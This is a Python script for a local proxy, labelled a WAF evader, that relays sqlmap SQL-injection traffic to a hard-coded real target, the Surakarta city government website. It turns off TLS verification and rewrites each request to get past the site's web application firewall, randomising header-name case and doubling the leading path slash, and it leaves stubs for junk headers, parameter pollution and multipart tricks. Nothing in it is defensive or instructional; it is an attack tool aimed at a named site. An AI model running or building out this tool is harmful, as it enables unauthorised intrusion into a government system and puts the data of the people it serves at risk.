
import logging
import random
import string
import socket
import threading
import sys
import time
import urllib.parse
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

# --- Configuration ---
LISTEN_PORT = 8081
TARGET_HOST = "surakarta.go.id"
TARGET_PORT = 443
USE_SSL = True

# --- Logging ---
logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(message)s', datefmt='%H:%M:%S')
logger = logging.getLogger("WAF_EVADER")

# --- Utils ---
def random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def random_case(s):
    return ''.join(random.choice([c.upper(), c.lower()]) for c in s)

# --- WAFFLED Mutation Logic ---
def mutate_headers(headers):
    """
    Applies header mutations to confuse WAFs.
    """
    new_headers = {}
    
    # 1. Random Case for Standard Headers
    for k, v in headers.items():
        if k.lower() in ["host", "content-length"]: # Don't mess with core protocol headers too much
             new_headers[k] = v
        else:
             new_headers[random_case(k)] = v

    # 2. Inject "Junk" Headers (Disrupted Header Injection)
    # WAFs might choke on these or burn processing time
    junk_header = random_string(5)
    new_headers[f"X-{junk_header}"] = random_string(10)

    # 3. User-Agent Rotation (if not already handled by sqlmap)
    # new_headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

    return new_headers

def mutate_path(path):
    """
    Applies path mutations (though risky for 404s).
    """
    # Simple example: /news -> //news (Nginx normalization often fixes this, WAFs might not match)
    if path.startswith("/"):
        return "/" + path
    return path

def mutate_body(body_bytes, content_type):
    """
    Applies advanced body mutations based on Content-Type.
    """
    if not body_bytes:
        return body_bytes

    # --- HTTP Parameter Pollution (HPP) ---
    # Simplistic HPP: Duplicate parameters if form-urlencoded
    # (SQLMap handles HPP better natively usually, but we can augment)
    
    # --- WAFFLED: Multipart Boundary Manipulation ---
    # Only applicable if Content-Type is multipart/form-data
    # This requires complex parsing, simple string replacement is risky without a full parser.
    # We will attempt a "Fake Boundary" injection if we detect a boundary.
    
    return body_bytes


# --- Proxy Handler ---
class WAFEvasionProxy(BaseHTTPRequestHandler):
    def do_GET(self):
        self.handle_request("GET")

    def do_POST(self):
        self.handle_request("POST")

    def do_HEAD(self):
        self.handle_request("HEAD")

    def handle_request(self, method):
        try:
            # 1. Read Request Body
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length) if content_length > 0 else b""

            # 2. Mutate Request (The Core Logic)
            target_path = mutate_path(self.path)
            # headers = mutate_headers(self.headers) # Python http.server headers are generic, need custom dict
            
            # Reconstruct Headers carefully
            # Note: We must ensure Host header matches Target
            
            # 3. Forward to Target
            # Establish SSL connection to target
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((TARGET_HOST, TARGET_PORT)) as sock:
                with context.wrap_socket(sock, server_hostname=TARGET_HOST) as ssock:
                    
                    # Build Raw Request
                    # Note: We manually construct the request to have full control over casing and ordering
                    
                    # Request Line
                    req_line = f"{method} {target_path} HTTP/1.1\r\n"
                    ssock.write(req_line.encode())
                    
                    # Headers
                    # Essential Headers
                    ssock.write(f"Host: {TARGET_HOST}\r\n".encode())
                    
                    # Mutated Headers
                    for k, v in self.headers.items():
                        if k.lower() in ['host', 'content-length', 'connection']: continue
                        
                        # Apply Random Case to Header Name
                        k_mutated = random_case(k)
                        ssock.write(f"{k_mutated}: {v}\r\n".encode())
                    
                    # Add Content-Length if body exists
                    if body:
                        ssock.write(f"Content-Length: {len(body)}\r\n".encode())
                        
                    # End Headers
                    ssock.write(b"Connection: close\r\n\r\n")
                    
                    # Body
                    if body:
                        ssock.write(body)
                        
                    # 4. Read Response
                    response = b""
                    while True:
                        data = ssock.read(4096)
                        if not data:
                            break
                        response += data
                        
                    # 5. Send Response back to SQLMap
                    # We need to parse the raw HTTP response from the server to send it back properly via BaseHTTPRequestHandler
                    # For simplicity, we just dump the raw socket bytes? No, http.server expects us to send headers then body.
                    
                    # Quick Analysis of Response for headers vs body
                    header_end = response.find(b"\r\n\r\n")
                    if header_end != -1:
                        raw_headers = response[:header_end].decode(errors='ignore')
                        response_body = response[header_end+4:]
                        
                        # Parse Status Line
                        status_line = raw_headers.split('\r\n')[0]
                        try:
                            proto, status_code, status_msg = status_line.split(' ', 2)
                            self.send_response(int(status_code), status_msg)
                        except:
                             self.send_response(500, "Proxy Error Parsing Remote Response")

                        # Parse Headers
                        for line in raw_headers.split('\r\n')[1:]:
                            if ':' in line:
                                key, value = line.split(':', 1)
                                self.send_header(key.strip(), value.strip())
                        self.end_headers()
                        
                        self.wfile.write(response_body)
                    else:
                        # Fallback if weird response
                        self.send_response(200)
                        self.end_headers()
                        self.wfile.write(response)

        except Exception as e:
            logger.error(f"Proxy Error: {e}")
            self.send_error(502, f"Proxy Error: {e}")

def run_proxy():
    server_address = ('127.0.0.1', LISTEN_PORT)
    httpd = HTTPServer(server_address, WAFEvasionProxy)
    print(f"[*] WAF Evasion Proxy Listening on 127.0.0.1:{LISTEN_PORT}")
    print(f"[*] Forwarding to {TARGET_HOST}:{TARGET_PORT} (SSL)")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Stopping Proxy")
        httpd.server_close()

if __name__ == '__main__':
    run_proxy()
